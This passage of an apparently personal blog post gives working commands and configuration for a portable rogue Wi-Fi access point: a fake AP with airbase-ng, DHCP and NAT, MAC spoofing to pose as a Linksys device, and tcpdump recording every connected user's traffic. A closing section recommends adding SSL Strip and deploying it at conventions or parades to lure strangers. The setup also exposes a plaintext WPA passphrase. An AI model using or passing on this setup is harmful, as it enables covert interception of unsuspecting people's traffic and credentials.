  &lt;li&gt;Once you have Debian installed on the CF and the board put together go ahead and start  it up.  Connect to the Alix board with a serial connection using 38400 baud, or 9600 if you didn’t change it in the last step.&lt;/li&gt;
  &lt;li&gt;Log in to Debian using root and your password&lt;/li&gt;
  &lt;li&gt;rm -f /etc/udev/rules.d/*_persistent-net.rules&lt;/li&gt;
  &lt;li&gt;rm -f /etc/udev/rules.d/*_persistent-net-generator.rules&lt;/li&gt;
  &lt;li&gt;reboot and connect the two USB WLAN cards&lt;/li&gt;
  &lt;li&gt;Once the system is back up and running log in again with root&lt;/li&gt;
  &lt;li&gt;install the following packages using the next command&lt;/li&gt;
  &lt;li&gt;apt-get install wpasupplicant bridge-utils wireless-tools tcpdump ssh&lt;/li&gt;
  &lt;li&gt;change the file /etc/network/interfaces to look like this (obviously use your wlan interfaces)
    &lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;# Used by ifup(8) and ifdown(8). See the interfaces(5) manpage or
# /usr/share/doc/ifupdown/examples for more information.
auto lo
iface lo inet loopback
allow-hotplug eth0
iface eth0 inet dhcp
iface wlan1 inet dhcp
wpa-ssid &quot;iPhone&quot;
wpa-mode managed
wpa-conf /root/Rogue-Sniff/conf/iphone.conf
wpa-psk nodule5958
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;    &lt;/div&gt;
  &lt;/li&gt;
  &lt;li&gt;Now we will need to install a bunch more stuff to get the necessary tools running&lt;/li&gt;
  &lt;li&gt;apt-get install apt-get install build-essential libssl-dev subversion check install iw&lt;/li&gt;
  &lt;li&gt;svn co http://trac.aircrack-ng.org/svn/trunk aircrack-ng&lt;/li&gt;
  &lt;li&gt;Make, check install, and then run airodump-ng-oui-update&lt;/li&gt;
  &lt;li&gt;Time to get the FakeAP up and running&lt;/li&gt;
  &lt;li&gt;apt-get install dhcp3-server&lt;/li&gt;
  &lt;li&gt;update-rc.d sic-dhcp-server remove&lt;/li&gt;
  &lt;li&gt;cp /etc/dhcp/dhcpd.conf /etc/dhcp/dhcpd.conf.bak&lt;/li&gt;
  &lt;li&gt;vi /etc/dhcp/dhcpd.conf and make it similar to this
    &lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;ddns-update-style ad-hoc;
default-lease-time 600;
max-lease-time 7200;
subnet 10.1.2.0 netmask 255.255.255.0 {
option subnet-mask 255.255.255.0;
option broadcast-address 10.1.2.255;
option routers 10.1.2.1;
option domain-name-servers 8.8.8.8;
range 10.1.2.100 10.1.2.150;
}
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;    &lt;/div&gt;
  &lt;/li&gt;
  &lt;li&gt;airmon-ng start wlan0&lt;/li&gt;
  &lt;li&gt;airbase-ng -e “ESSID” -c 9 mon0&lt;/li&gt;
  &lt;li&gt;ifconfig at0 up&lt;/li&gt;
  &lt;li&gt;ifconfig at0 10.1.2.1 netmask 255.255.255.0&lt;/li&gt;
  &lt;li&gt;route add -net 10.1.2.0 netmask 255.255.255.0 gw 10.1.2.1&lt;/li&gt;
  &lt;li&gt;dhcpd -cf /etc/dhcpd/dhcpd.conf -pf /var/run/dhcpd.pid at0&lt;/li&gt;
  &lt;li&gt;Now you have an AP up and running for the sniffing but you know no one will use it unless you have it providing internet access&lt;/li&gt;
  &lt;li&gt;Connect the Debian box to your cell phone (tethering) so that you can provide internet access to others on the go&lt;/li&gt;
  &lt;li&gt;Create the file iPhone.conf and put the WPA/WPA2 settings in to tether to your phone
    &lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;network={
ssid=&quot;iPhone&quot;
key_mgmt=WPA-PSK
psk=(put your hex in here -&amp;gt; wpa_passphrase [SSID] [passphrase])
}
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;    &lt;/div&gt;
  &lt;/li&gt;
  &lt;li&gt;Test out the connection by running the following&lt;/li&gt;
  &lt;li&gt;wpa_supplicant -i wlan1 -B -c iphone.conf&lt;/li&gt;
  &lt;li&gt;Get IP Tables running by creating the following script
    &lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;c&quot;&gt;#!/bin/sh&lt;/span&gt;
&lt;span class=&quot;nv&quot;&gt;PATH&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;/usr/sbin:/sbin:/bin:/usr/bin
&lt;span class=&quot;c&quot;&gt;#&lt;/span&gt;
&lt;span class=&quot;c&quot;&gt;# delete all existing rules.&lt;/span&gt;
&lt;span class=&quot;c&quot;&gt;#&lt;/span&gt;
iptables &lt;span class=&quot;nt&quot;&gt;-F&lt;/span&gt;
iptables &lt;span class=&quot;nt&quot;&gt;-t&lt;/span&gt; nat &lt;span class=&quot;nt&quot;&gt;-F&lt;/span&gt;
iptables &lt;span class=&quot;nt&quot;&gt;-t&lt;/span&gt; mangle &lt;span class=&quot;nt&quot;&gt;-F&lt;/span&gt;
iptables &lt;span class=&quot;nt&quot;&gt;-X&lt;/span&gt;
&lt;span class=&quot;c&quot;&gt;# Always accept loopback traffic&lt;/span&gt;
iptables &lt;span class=&quot;nt&quot;&gt;-A&lt;/span&gt; INPUT &lt;span class=&quot;nt&quot;&gt;-i&lt;/span&gt; lo &lt;span class=&quot;nt&quot;&gt;-j&lt;/span&gt; ACCEPT
&lt;span class=&quot;c&quot;&gt;# Allow established connections, and those not coming from the outside&lt;/span&gt;
iptables &lt;span class=&quot;nt&quot;&gt;-A&lt;/span&gt; INPUT &lt;span class=&quot;nt&quot;&gt;-m&lt;/span&gt; state &lt;span class=&quot;nt&quot;&gt;--state&lt;/span&gt; ESTABLISHED,RELATED &lt;span class=&quot;nt&quot;&gt;-j&lt;/span&gt; ACCEPT
iptables &lt;span class=&quot;nt&quot;&gt;-A&lt;/span&gt; INPUT &lt;span class=&quot;nt&quot;&gt;-m&lt;/span&gt; state &lt;span class=&quot;nt&quot;&gt;--state&lt;/span&gt; NEW &lt;span class=&quot;nt&quot;&gt;-j&lt;/span&gt; ACCEPT
iptables &lt;span class=&quot;nt&quot;&gt;-A&lt;/span&gt; FORWARD &lt;span class=&quot;nt&quot;&gt;-i&lt;/span&gt; wlan1 &lt;span class=&quot;nt&quot;&gt;-o&lt;/span&gt; at0 &lt;span class=&quot;nt&quot;&gt;-m&lt;/span&gt; state &lt;span class=&quot;nt&quot;&gt;--state&lt;/span&gt; ESTABLISHED,RELATED &lt;span class=&quot;nt&quot;&gt;-j&lt;/span&gt; ACCEPT
&lt;span class=&quot;c&quot;&gt;# Allow outgoing connections from the LAN side.&lt;/span&gt;
iptables &lt;span class=&quot;nt&quot;&gt;-A&lt;/span&gt; FORWARD &lt;span class=&quot;nt&quot;&gt;-i&lt;/span&gt; at0 &lt;span class=&quot;nt&quot;&gt;-o&lt;/span&gt; wlan1 &lt;span class=&quot;nt&quot;&gt;-j&lt;/span&gt; ACCEPT
iptables &lt;span class=&quot;nt&quot;&gt;-t&lt;/span&gt; nat &lt;span class=&quot;nt&quot;&gt;-A&lt;/span&gt; PREROUTING &lt;span class=&quot;nt&quot;&gt;-p&lt;/span&gt; tcp &lt;span class=&quot;nt&quot;&gt;-i&lt;/span&gt; at0 &lt;span class=&quot;nt&quot;&gt;--destination-port&lt;/span&gt; 80 &lt;span class=&quot;nt&quot;&gt;-j&lt;/span&gt; REDIRECT &lt;span class=&quot;nt&quot;&gt;--to-port&lt;/span&gt; 8080
&lt;span class=&quot;c&quot;&gt;# Masquerade.&lt;/span&gt;
iptables &lt;span class=&quot;nt&quot;&gt;-t&lt;/span&gt; nat &lt;span class=&quot;nt&quot;&gt;-A&lt;/span&gt; POSTROUTING &lt;span class=&quot;nt&quot;&gt;-o&lt;/span&gt; wlan1 &lt;span class=&quot;nt&quot;&gt;-j&lt;/span&gt; MASQUERADE
&lt;span class=&quot;c&quot;&gt;# Don't forward from the outside to the inside.&lt;/span&gt;
iptables &lt;span class=&quot;nt&quot;&gt;-A&lt;/span&gt; FORWARD &lt;span class=&quot;nt&quot;&gt;-i&lt;/span&gt; wlan1 &lt;span class=&quot;nt&quot;&gt;-o&lt;/span&gt; wlan1 &lt;span class=&quot;nt&quot;&gt;-j&lt;/span&gt; REJECT
&lt;span class=&quot;c&quot;&gt;# Enable routing.&lt;/span&gt;
&lt;span class=&quot;nb&quot;&gt;echo &lt;/span&gt;1 &lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt; /proc/sys/net/ipv4/ip_forward
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;    &lt;/div&gt;
  &lt;/li&gt;
  &lt;li&gt;If that is all working for you create a bash script with the following (with values that will work for your network)
    &lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;c&quot;&gt;#! /bin/bash&lt;/span&gt;
&lt;span class=&quot;c&quot;&gt;# bring up the rogue and start sniffing&lt;/span&gt;
&lt;span class=&quot;nb&quot;&gt;cd&lt;/span&gt; /
&lt;span class=&quot;c&quot;&gt;# change the mac to a Linksys AP&lt;/span&gt;
/usr/bin/macchanger &lt;span class=&quot;nt&quot;&gt;--mac&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;00:06:25:3E:BD:93 wlan0
/usr/bin/macchanger &lt;span class=&quot;nt&quot;&gt;-r&lt;/span&gt; wlan1
&lt;span class=&quot;nb&quot;&gt;echo&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;connecting to phone&quot;&lt;/span&gt;
/sbin/wpa_supplicant &lt;span class=&quot;nt&quot;&gt;-i&lt;/span&gt; wlan1 &lt;span class=&quot;nt&quot;&gt;-B&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-c&lt;/span&gt; /root/iphone.conf
&lt;span class=&quot;nb&quot;&gt;sleep &lt;/span&gt;45
&lt;span class=&quot;nb&quot;&gt;echo&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;getting ip address&quot;&lt;/span&gt;
/sbin/dhclient wlan1
/usr/local/sbin/airbase-ng &lt;span class=&quot;nt&quot;&gt;--essid&lt;/span&gt; hotspot &lt;span class=&quot;nt&quot;&gt;-c&lt;/span&gt; 11 wlan0 &amp;amp;
&lt;span class=&quot;nb&quot;&gt;sleep &lt;/span&gt;15
/sbin/ifconfig at0 10.1.1.2 netmask 255.255.255.0
/sbin/route add &lt;span class=&quot;nt&quot;&gt;-net&lt;/span&gt; 10.1.1.0 netmask 255.255.255.0 gw 10.1.1.2
/sbin/ifconfig at0 up
&lt;span class=&quot;nb&quot;&gt;sleep &lt;/span&gt;5
/usr/sbin/dhcpd &lt;span class=&quot;nt&quot;&gt;-cf&lt;/span&gt; /etc/dhcp/dhcpd.conf
./root/Rogue-Sniff/iptables.sh
tcpdump &lt;span class=&quot;nt&quot;&gt;-i&lt;/span&gt; wlan1 &lt;span class=&quot;nt&quot;&gt;-s&lt;/span&gt; 0 &lt;span class=&quot;nt&quot;&gt;-e&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-vv&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-XX&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;link&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;25] &lt;span class=&quot;o&quot;&gt;!=&lt;/span&gt; 0x80 &lt;span class=&quot;nt&quot;&gt;-w&lt;/span&gt; /root/Rogue-Sniff/capture
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;    &lt;/div&gt;
  &lt;/li&gt;
  &lt;li&gt;Add a line to execute this script at startup with rc.local&lt;/li&gt;
  &lt;li&gt;Now that your CF card is at a point where you want it pull it off the Alix board and DD it to another Linux box so that you will never have to go through all this again.&lt;/li&gt;
  &lt;li&gt;Connect your portable power source and out the door you go!  I used two 9V batteries that do power the setup, but I highly doubt that it would last long.&lt;/li&gt;
&lt;/ol&gt;

&lt;h2 id=&quot;going-further&quot;&gt;Going Further&lt;/h2&gt;

&lt;ol&gt;
  &lt;li&gt;When acting as an AP for people the main point here is to sniff traffic and record it.  What point would it be to record encrypted traffic?  Go a little further with this and throw SSL Strip into the mix!&lt;/li&gt;
  &lt;li&gt;Very Useful Applications (if you have room on the CF)
    &lt;ul&gt;
      &lt;li&gt;python&lt;/li&gt;
      &lt;li&gt;python-twisted-web&lt;/li&gt;
      &lt;li&gt;kismet&lt;/li&gt;
      &lt;li&gt;nmap&lt;/li&gt;
      &lt;li&gt;telnet&lt;/li&gt;
      &lt;li&gt;fping&lt;/li&gt;
      &lt;li&gt;smbclient&lt;/li&gt;
      &lt;li&gt;curl&lt;/li&gt;
      &lt;li&gt;links&lt;/li&gt;
      &lt;li&gt;dnsutils&lt;/li&gt;
      &lt;li&gt;Tenable Nessus&lt;/li&gt;
      &lt;li&gt;Metasploit Framework&lt;/li&gt;
    &lt;/ul&gt;
  &lt;/li&gt;
  &lt;li&gt;The best places to take advantage of wireless networks is in highly populated areas that do not have hotspots.  Think of a convention or parade.  Some people really what to get on the net, and you could even highjack their broadcasts … say they are probing for “linksys” why not rename your SSID?&lt;/li&gt;
&lt;/ol&gt;

&lt;h2 id=&quot;images-of-my-project&quot;&gt;Images of My Project&lt;/h2&gt;
&lt;p&gt;&lt;img src=&quot;/assets/images/mobile/1.png&quot; alt=&quot;alt text&quot; title=&quot;1&quot; /&gt;&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/mobile/2.png&quot; alt=&quot;alt text&quot; title=&quot;2&quot; /&gt;&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/mobile/3.png&quot; alt=&quot;alt text&quot; title=&quot;3&quot; /&gt;&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/mobile/4.png&quot; alt=&quot;alt text&quot; title=&quot;4&quot; /&gt;&lt;/p&gt;</content><author><name>RabbidByte</name></author><summary type="html">I have always loved wireless security. It is just such an easy target. The only issue that I have had is that I was restricted to carrying around a laptop and I just didn’t like the idea of having to operate the software while I was out. So I came up with this neat little COMPLETELY mobile wireless hacking/trap solution. Here is what you will need. Equipment an Alix board, CF, and enclosure two ALPHA USB Wireless cards a cell phone that you can tether to mobile power solution NOTES I have written this very quickly and this may not be entirely accurate. Although the tests that I have done did work this post has been put together using loose notes that I made through my testing. I may (one day) return to this and tidy it up and add more detail, however I set out to do what I wanted and I wish to move on to newer projects. Instructions To start build your Alix system. I built mine with Debian and I found a GREAT tutorial on how to get it loaded on a CF for your Alix board here -&amp;gt; http://www.youtube.com/watch?v=6VPsgR4pMik Install the most basic packages to to run the system, we will add the other stuff later. Once you have Debian installed on the CF and the board put together go ahead and start it up. Connect to the Alix board with a serial connection using 38400 baud, or 9600 if you didn’t change it in the last step. Log in to Debian using root and your password rm -f /etc/udev/rules.d/*_persistent-net.rules rm -f /etc/udev/rules.d/*_persistent-net-generator.rules reboot and connect the two USB WLAN cards Once the system is back up and running log in again with root install the following packages using the next command apt-get install wpasupplicant bridge-utils wireless-tools tcpdump ssh change the file /etc/network/interfaces to look like this (obviously use your wlan interfaces) # Used by ifup(8) and ifdown(8). See the interfaces(5) manpage or # /usr/share/doc/ifupdown/examples for more information. auto lo iface lo inet loopback allow-hotplug eth0 iface eth0 inet dhcp iface wlan1 inet dhcp wpa-ssid &quot;iPhone&quot; wpa-mode managed wpa-conf /root/Rogue-Sniff/conf/iphone.conf wpa-psk nodule5958 Now we will need to install a bunch more stuff to get the necessary tools running apt-get install apt-get install build-essential libssl-dev subversion check install iw svn co http://trac.aircrack-ng.org/svn/trunk aircrack-ng Make, check install, and then run airodump-ng-oui-update Time to get the FakeAP up and running apt-get install dhcp3-server update-rc.d sic-dhcp-server remove cp /etc/dhcp/dhcpd.conf /etc/dhcp/dhcpd.conf.bak vi /etc/dhcp/dhcpd.conf and make it similar to this ddns-update-style ad-hoc; default-lease-time 600; max-lease-time 7200; subnet 10.1.2.0 netmask 255.255.255.0 { option subnet-mask 255.255.255.0; option broadcast-address 10.1.2.255; option routers 10.1.2.1; option domain-name-servers 8.8.8.8; range 10.1.2.100 10.1.2.150; } airmon-ng start wlan0 airbase-ng -e “ESSID” -c 9 mon0 ifconfig at0 up ifconfig at0 10.1.2.1 netmask 255.255.255.0 route add -net 10.1.2.0 netmask 255.255.255.0 gw 10.1.2.1 dhcpd -cf /etc/dhcpd/dhcpd.conf -pf /var/run/dhcpd.pid at0 Now you have an AP up and running for the sniffing but you know no one will use it unless you have it providing internet access Connect the Debian box to your cell phone (tethering) so that you can provide internet access to others on the go Create the file iPhone.conf and put the WPA/WPA2 settings in to tether to your phone network={ ssid=&quot;iPhone&quot; key_mgmt=WPA-PSK psk=(put your hex in here -&amp;gt; wpa_passphrase [SSID] [passphrase]) } Test out the connection by running the following wpa_supplicant -i wlan1 -B -c iphone.conf Get IP Tables running by creating the following script #!/bin/sh PATH=/usr/sbin:/sbin:/bin:/usr/bin # # delete all existing rules. # iptables -F iptables -t nat -F iptables -t mangle -F iptables -X # Always accept loopback traffic iptables -A INPUT -i lo -j ACCEPT # Allow established connections, and those not coming from the outside iptables -A INPUT -m state --state ESTABLISHED,RELATED -j ACCEPT iptables -A INPUT -m state --state NEW -j ACCEPT iptables -A FORWARD -i wlan1 -o at0 -m state --state ESTABLISHED,RELATED -j ACCEPT # Allow outgoing connections from the LAN side. iptables -A FORWARD -i at0 -o wlan1 -j ACCEPT iptables -t nat -A PREROUTING -p tcp -i at0 --destination-port 80 -j REDIRECT --to-port 8080 # Masquerade. iptables -t nat -A POSTROUTING -o wlan1 -j MASQUERADE # Don't forward from the outside to the inside. iptables -A FORWARD -i wlan1 -o wlan1 -j REJECT # Enable routing. echo 1 &amp;gt; /proc/sys/net/ipv4/ip_forward If that is all working for you create a bash script with the following (with values that will work for your network) #! /bin/bash # bring up the rogue and start sniffing cd / # change the mac to a Linksys AP /usr/bin/macchanger --mac=00:06:25:3E:BD:93 wlan0 /usr/bin/macchanger -r wlan1 echo &quot;connecting to phone&quot; /sbin/wpa_supplicant -i wlan1 -B -c /root/iphone.conf sleep 45 echo &quot;getting ip address&quot; /sbin/dhclient wlan1 /usr/local/sbin/airbase-ng --essid hotspot -c 11 wlan0 &amp;amp; sleep 15 /sbin/ifconfig at0 10.1.1.2 netmask 255.255.255.0 /sbin/route add -net 10.1.1.0 netmask 255.255.255.0 gw 10.1.1.2 /sbin/ifconfig at0 up sleep 5 /usr/sbin/dhcpd -cf /etc/dhcp/dhcpd.conf ./root/Rogue-Sniff/iptables.sh tcpdump -i wlan1 -s 0 -e -vv -XX link[25] != 0x80 -w /root/Rogue-Sniff/capture Add a line to execute this script at startup with rc.local Now that your CF card is at a point where you want it pull it off the Alix board and DD it to another Linux box so that you will never have to go through all this again. Connect your portable power source and out the door you go! I used two 9V batteries that do power the setup, but I highly doubt that it would last long. Going Further When acting as an AP for people the main point here is to sniff traffic and record it. What point would it be to record encrypted traffic? Go a little further with this and throw SSL Strip into the mix! Very Useful Applications (if you have room on the CF) python python-twisted-web kismet nmap telnet fping smbclient curl links dnsutils Tenable Nessus Metasploit Framework The best places to take advantage of wireless networks is in highly populated areas that do not have hotspots. Think of a convention or parade. Some people really what to get on the net, and you could even highjack their broadcasts … say they are probing for “linksys” why not rename your SSID? Images of My Project</summary></entry></feed>